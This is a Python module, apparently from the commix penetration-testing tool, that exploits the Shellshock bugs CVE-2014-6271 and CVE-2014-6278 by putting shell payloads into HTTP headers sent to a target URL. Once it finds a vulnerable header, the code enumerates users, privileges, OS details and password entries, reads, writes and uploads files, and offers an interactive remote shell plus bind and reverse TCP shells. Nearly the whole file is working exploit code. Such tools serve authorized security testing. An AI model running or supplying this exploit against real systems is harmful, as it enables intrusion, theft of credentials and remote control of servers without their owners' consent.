#!/usr/bin/env python

import re
import os
import sys
import string
import random
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import http_client as _http_client
from src.utils import common
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.core.requests import proxy
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.shells import bind_tcp
from src.core.shells import reverse_tcp
from src.core.requests import parameters
from src.core.requests import headers as log_http_headers
from src.core.injections.controller import checks

default_user_agent = menu.options.agent
default_cookie = ""

if menu.options.cookie:
  if settings.INJECT_TAG in menu.options.cookie:
    menu.options.cookie = menu.options.cookie.replace(settings.INJECT_TAG , "")
  default_cookie = menu.options.cookie

"""
This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in Apache CGI.
[1] CVE-2014-6271: https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271
[2] CVE-2014-6278: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
"""

if settings.MULTI_TARGETS or settings.STDIN_PARSING:
  if settings.COOKIE_INJECTION:
    settings.COOKIE_INJECTION = None
  if settings.USER_AGENT_INJECTION:
    settings.USER_AGENT_INJECTION = None
  if settings.REFERER_INJECTION:
    settings.REFERER_INJECTION = None

# Available Shellshock CVEs
shellshock_cves = [
"CVE-2014-6271",
"CVE-2014-6278"
]

"""
Available shellshock payloads
"""
def shellshock_payloads(cve, attack_vector):
  if cve == shellshock_cves[0] :
    payload = "() { :; }; " + attack_vector
  elif cve == shellshock_cves[1] :
    payload = "() { _; } >_[$($())] { " + attack_vector + " } "
  else:
    pass
  return payload

"""
Shellshock bug exploitation
"""
def shellshock_exploitation(cve, cmd):
  attack_vector = " echo; " + cmd + ";"
  payload = shellshock_payloads(cve, attack_vector)
  return payload

"""
Print percentage calculation
"""
def print_percentage(no_result, response_info, cve, float_percent):
  if float(float_percent) == 100:
    if no_result == True:
      percent = settings.FAIL_STATUS
    else:
      percent = settings.info_msg
      no_result = False
  elif len(response_info) > 0 and cve in response_info:
    percent = settings.info_msg
    no_result = False
  else:
    percent = str(float_percent)+ "%"
  return percent, no_result

"""
Enumeration Options
"""
def enumeration(url, cve, check_header, filename):
  _ = False
  if menu.options.hostname:
    checks.print_enumenation().hostname_msg()
    cmd = settings.HOSTNAME
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if shell:
      checks.print_hostname(shell, filename, _)
    settings.ENUMERATION_DONE = True

  if menu.options.current_user:
    checks.print_enumenation().current_user_msg()
    cmd = settings.CURRENT_USER
    cu_account, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if cu_account:
      checks.print_current_user(cu_account, filename, _)
    settings.ENUMERATION_DONE = True

  if menu.options.is_root:
    checks.print_enumenation().check_privs_msg()
    cmd = re.findall(r"" + r"\$(.*)", settings.IS_ROOT)
    cmd = ''.join(cmd)
    cmd = checks.remove_parenthesis(cmd)
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if shell:
      checks.print_current_user_privs(shell, filename, _)
    settings.ENUMERATION_DONE = True

  if menu.options.sys_info:
    checks.print_enumenation().os_info_msg()
    cmd = settings.RECOGNISE_OS            
    target_os, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if target_os:
      if target_os == "Linux":
        cmd = settings.DISTRO_INFO
        distro_name, payload = cmd_exec(url, cmd, cve, check_header, filename)
        if len(distro_name) != 0:
          target_os = target_os + settings.SINGLE_WHITESPACE + distro_name
        cmd = settings.RECOGNISE_HP
        target_arch, payload = cmd_exec(url, cmd, cve, check_header, filename)
        checks.print_os_info(target_os, target_arch, filename, _)
    settings.ENUMERATION_DONE = True

  if menu.options.users:
    checks.print_enumenation().print_users_msg()
    cmd = settings.SYS_USERS
    cmd = checks.remove_command_substitution(cmd)
    sys_users, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if sys_users:
      checks.print_users(sys_users, filename, _, alter_shell=False) 
    settings.ENUMERATION_DONE = True

  if menu.options.passwords:
    checks.print_enumenation().print_passes_msg() 
    cmd = settings.SYS_PASSES
    cmd = checks.remove_command_substitution(cmd)         
    sys_passes, payload = cmd_exec(url, cmd, cve, check_header, filename)
    if sys_passes :
      checks.print_passes(sys_users, filename, _, alter_shell=False)
    settings.ENUMERATION_DONE = True  

"""
File Access Options
"""
def file_access(url, cve, check_header, filename):

  if menu.options.file_write:
    file_to_write, dest_to_write, content = checks.check_file_to_write()
    cmd = checks.write_content(content, dest_to_write)
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    cmd = checks.check_file(dest_to_write)
    cmd = checks.remove_command_substitution(cmd)
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    checks.file_write_status(shell, dest_to_write)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_upload:
    cmd, dest_to_upload = checks.check_file_to_upload()
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    shell = "".join(str(p) for p in shell)
    cmd = checks.check_file(dest_to_upload)
    cmd = checks.remove_command_substitution(cmd)
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    shell = "".join(str(p) for p in shell)
    checks.file_upload_status(shell, dest_to_upload)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_read:
    cmd, file_to_read = checks.file_content_to_read()
    cmd = checks.remove_command_substitution(cmd)
    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
    checks.file_read_status(shell, file_to_read, filename)
    settings.FILE_ACCESS_DONE = True

"""
Execute the bind / reverse TCP shell
"""
def execute_shell(url, cmd, cve, check_header, filename, os_shell_option):
  shell, payload = cmd_exec(url, cmd, cve, check_header, filename)

"""
Configure the bind TCP shell
"""
def bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):
  settings.BIND_TCP = True
  # Set up RHOST / LPORT for the bind TCP connection.
  bind_tcp.configure_bind_tcp(separator = "")
  if settings.BIND_TCP == False:
    if settings.REVERSE_TCP == True:
      os_shell_option = "reverse_tcp"
      reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
    return go_back, go_back_again
  while True:
    if settings.RHOST and settings.LPORT in settings.SHELL_OPTIONS:
      result = checks.check_bind_tcp_options(settings.RHOST)
    else:  
      cmd = bind_tcp.bind_tcp_options(separator = "")
      result = checks.check_bind_tcp_options(cmd)
    if result != None:
      if result == 0:
        return False
      elif result == 1 or result == 2:
        go_back_again = True
        settings.BIND_TCP = False
      return go_back, go_back_again
    # execute bind TCP shell 
    execute_shell(url, cmd, cve, check_header, filename, os_shell_option)

"""
Configure the reverse TCP shell
"""
def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):
  settings.REVERSE_TCP = True
  # Set up LHOST / LPORT for the reverse TCP connection.
  reverse_tcp.configure_reverse_tcp(separator = "")
  if settings.REVERSE_TCP == False:
    if settings.BIND_TCP == True:
      os_shell_option = "bind_tcp"
      bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
    return go_back, go_back_again
  while True:
    if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
      result = checks.check_reverse_tcp_options(settings.LHOST)
    else:  
      cmd = reverse_tcp.reverse_tcp_options(separator = "")
      result = checks.check_reverse_tcp_options(cmd)
    if result != None:
      if result == 0:
        return False
      elif result == 1 or result == 2:
        go_back_again = True
        settings.REVERSE_TCP = False
      return go_back, go_back_again
    # execute bind TCP shell 
    execute_shell(url, cmd, cve, check_header, filename, os_shell_option)

"""
Check commix shell options
"""
def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again,no_result):
  if os_shell_option == False:
    if no_result == True:
      return False
    else:
      return True 

  if os_shell_option == None:
    return go_back, go_back_again

  # The "back" option
  elif os_shell_option == "back":
    go_back = True
    return go_back, go_back_again

  # The "os_shell" option
  elif os_shell_option == "os_shell": 
    warn_msg = "You are into the '" + os_shell_option + "' mode."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    return go_back, go_back_again

  # The "bind_tcp" option
  elif os_shell_option == "bind_tcp":
    go_back, go_back_again = bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
    return go_back, go_back_again

  # The "reverse_tcp" option
  elif os_shell_option == "reverse_tcp":
    go_back, go_back_again = reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
    return go_back, go_back_again

  # The "quit" / "exit" options
  elif os_shell_option == "quit" or os_shell_option == "exit":                    
    checks.quit(filename, url, _ = True)

"""
The main shellshock handler
"""
def shellshock_handler(url, http_request_method, filename):

  counter = 1
  vp_flag = True
  no_result = True
  export_injection_info = False

  injection_type = "results-based command injection"
  technique = "shellshock injection technique"

  try: 
    i = 0
    total = len(shellshock_cves) * len(settings.SHELLSHOCK_HTTP_HEADERS)
    for check_header in settings.SHELLSHOCK_HTTP_HEADERS:
      for cve in shellshock_cves:
        # Check injection state
        settings.DETECTION_PHASE = True
        settings.EXPLOITATION_PHASE = False
        i = i + 1
        attack_vector = "echo" + settings.SINGLE_WHITESPACE + cve + ":Done;"
        payload = shellshock_payloads(cve, attack_vector)

        # Check if defined "--verbose" option.
        if settings.VERBOSITY_LEVEL != 0:
          settings.print_data_to_stdout(settings.print_payload(payload))
        header = {check_header : payload}
        request = _urllib.request.Request(url, None, header)
        if check_header == settings.COOKIE:
          menu.options.cookie = payload 
        if check_header == settings.USER_AGENT:
          menu.options.agent = payload
        log_http_headers.do_check(request)
        log_http_headers.check_http_traffic(request)
        # Check if defined any HTTP Proxy.
        if menu.options.proxy or menu.options.ignore_proxy or menu.options.tor: 
          response = proxy.use_proxy(request)
        else:
          response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)

        if type(response) is bool:
          response_info = ""
        else:
          response_info = response.info()

        if check_header == settings.COOKIE:
          menu.options.cookie = default_cookie
        if check_header == settings.USER_AGENT:
          menu.options.agent = default_user_agent  

        percent, float_percent = checks.percentage_calculation(i, total)
        percent, no_result = print_percentage(no_result, response_info, cve, float_percent)

        if settings.VERBOSITY_LEVEL == 0:
          info_msg = "Testing the " + technique + "." + "" + percent + ""
          settings.print_data_to_stdout(settings.END_LINE.CR +settings.print_info_msg(info_msg))
          

        if no_result == False:
          # Check injection state
          settings.DETECTION_PHASE = False
          settings.EXPLOITATION_PHASE = True
          # Print the findings to log file.
          if export_injection_info == False:
            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
          
          vuln_parameter = "HTTP Header"
          the_type = settings.SINGLE_WHITESPACE + vuln_parameter
          check_header = settings.SINGLE_WHITESPACE + check_header
          vp_flag = logs.add_parameter(vp_flag, filename, the_type, check_header, http_request_method, vuln_parameter, payload)
          check_header = check_header[1:]
          logs.update_payload(filename, counter, payload) 

          if settings.VERBOSITY_LEVEL != 0:
            checks.total_of_requests()

          settings.CHECKING_PARAMETER = check_header + settings.SINGLE_WHITESPACE + vuln_parameter
          # Print the findings to terminal.
          info_msg = settings.CHECKING_PARAMETER + " appears to be injectable via " + technique + "."
          if settings.VERBOSITY_LEVEL == 0:
            settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
          settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
          settings.print_data_to_stdout(settings.print_sub_content(payload))

          # Enumeration options.
          if settings.ENUMERATION_DONE:
            while True:
              message = "Do you want to ignore stored session and enumerate again? [y/N] > "
              enumerate_again = common.read_input(message, default="N", check_batch=True)
              if enumerate_again in settings.CHOICE_YES:
                enumeration(url, cve, check_header, filename)
                break
              elif enumerate_again in settings.CHOICE_NO: 
                break
              elif enumerate_again in settings.CHOICE_QUIT:
                raise SystemExit()
              else:
                common.invalid_option(enumerate_again)  
                pass
          else:
            enumeration(url, cve, check_header, filename)

          # File access options.
          if settings.FILE_ACCESS_DONE == True:
            while True:
              message = "Do you want to ignore stored session and access files again? [y/N] > "
              file_access_again = common.read_input(message, default="N", check_batch=True)
              if file_access_again in settings.CHOICE_YES:
                file_access(url, cve, check_header, filename)
                break
              elif file_access_again in settings.CHOICE_NO: 
                break
              elif file_access_again in settings.CHOICE_QUIT:
                raise SystemExit()
              else:
                common.invalid_option(file_access_again)  
                pass
          else:
            file_access(url, cve, check_header, filename)

          if menu.options.os_cmd:
            cmd = menu.options.os_cmd 
            checks.print_enumenation().print_single_os_cmd_msg(cmd)
            shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
            checks.print_single_os_cmd(cmd, shell, filename)

          # Pseudo-Terminal shell
          try:
            checks.alert()
            go_back = False
            go_back_again = False
            while True:
              if go_back == True:
                break
              gotshell = checks.enable_shell(url)
              if gotshell in settings.CHOICE_YES:
                settings.print_data_to_stdout(settings.OS_SHELL_TITLE)
                if settings.READLINE_ERROR:
                  checks.no_readline_module()
                while True:
                  if not settings.READLINE_ERROR:
                    checks.tab_autocompleter()
                  settings.print_data_to_stdout(settings.END_LINE.CR +settings.OS_SHELL)
                  cmd = common.read_input(message="", default="os_shell", check_batch=True)
                  cmd = checks.escaped_cmd(cmd)
                  if cmd.lower() in settings.SHELL_OPTIONS:
                    os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
                    if os_shell_option is not False:
                      go_back, go_back_again = check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again, no_result)
                      if go_back and go_back_again == False:
                        break
                      if go_back and go_back_again:
                        return True 
                  else: 
                    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
                    if shell != "":
                      # Update logs with executed cmds and execution results.
                      logs.executed_command(filename, cmd, shell)
                      settings.print_data_to_stdout(settings.command_execution_output(shell))
                    else:
                      debug_msg = "Executing the '" + cmd + "' command. "
                      if settings.VERBOSITY_LEVEL == 1:
                        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
                        settings.print_data_to_stdout(settings.print_payload(payload))
                      elif settings.VERBOSITY_LEVEL >= 2:
                        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
                        settings.print_data_to_stdout(settings.print_payload(payload))
                      if settings.VERBOSITY_LEVEL >= 2:
                        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                      err_msg = common.invalid_cmd_output(cmd)
                      settings.print_data_to_stdout(settings.print_error_msg(err_msg))
              elif gotshell in settings.CHOICE_NO:
                if checks.next_attack_vector(technique, go_back) == True:
                  break
                else:
                  if no_result == True:
                    return False 
                  else:
                    logs.logs_notification(filename)
                    return True

              elif gotshell in settings.CHOICE_QUIT:
                raise SystemExit()

              else:
                common.invalid_option(gotshell)  
                continue
              break
          
          except (KeyboardInterrupt, SystemExit): 
            settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
            raise

          except EOFError:
            if settings.STDIN_PARSING:
              settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
            err_msg = "Exiting, due to EOFError."
            settings.print_data_to_stdout(settings.print_error_msg(err_msg))
            raise

          except TypeError:
            break

    if no_result == True:
      if settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      err_msg = "All tested HTTP headers appear to be not injectable."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()
    else:
      logs.logs_notification(filename)
            
  except _urllib.error.HTTPError as err_msg:
    if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR or str(err_msg.code) == settings.BAD_REQUEST:
      response = False  
    elif settings.IGNORE_ERR_MSG == False:
      err = str(err_msg) + "."
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      settings.print_data_to_stdout(settings.print_critical_msg(err))
      continue_tests = checks.continue_tests(err_msg)
      if continue_tests == True:
        settings.IGNORE_ERR_MSG = True
      else:
        raise SystemExit()

  except _urllib.error.URLError as err_msg:
    err_msg = str(err_msg.reason).split(settings.SINGLE_WHITESPACE)[2:]
    err_msg = ' '.join(err_msg)+ "."
    if settings.VERBOSITY_LEVEL != 0 and settings.LOAD_SESSION == False:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

  except _http_client.IncompleteRead as err_msg:
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg + "."))
    raise SystemExit()  
    
"""
Execute user commands
"""
def cmd_exec(url, cmd, cve, check_header, filename):
 
  """
  Check for shellshock 'shell'
  """
  def check_for_shell(url, cmd, cve, check_header, filename):
    try:
      TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
      cmd = "echo " + TAG + "$(" + cmd + ")" + TAG
      payload = shellshock_exploitation(cve, cmd)
      debug_msg = "Executing the '" + cmd + "' command. "
      if settings.VERBOSITY_LEVEL != 0:
        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

      if settings.VERBOSITY_LEVEL != 0:
        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
        settings.print_data_to_stdout(settings.print_payload(payload))

      header = {check_header : payload}
      request = _urllib.request.Request(url, None, header)
      if check_header == settings.USER_AGENT:
        menu.options.agent = payload
      log_http_headers.do_check(request)
      log_http_headers.check_http_traffic(request)
      # Check if defined any HTTP Proxy.
      if menu.options.proxy or menu.options.ignore_proxy or menu.options.tor: 
        response = proxy.use_proxy(request)
      else:
        response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
      if check_header == settings.USER_AGENT:
        menu.options.agent = default_user_agent  
      shell = checks.page_encoding(response, action="decode").rstrip().replace('\n',' ')
      shell = re.findall(r"" + TAG + "(.*)" + TAG, shell)
      shell = ''.join(shell)
      return shell, payload

    except _urllib.error.URLError as err_msg:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()

  shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
  if len(shell) == 0:
    cmd = "/bin/" + cmd
    shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
    if len(shell) > 0:
      pass
    elif len(shell) == 0:
      cmd = "/usr" + cmd
      shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
      if len(shell) > 0:
        pass

  return shell, payload

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, http_request_method, filename):       
  if shellshock_handler(url, http_request_method, filename) == False:
    return False

# eof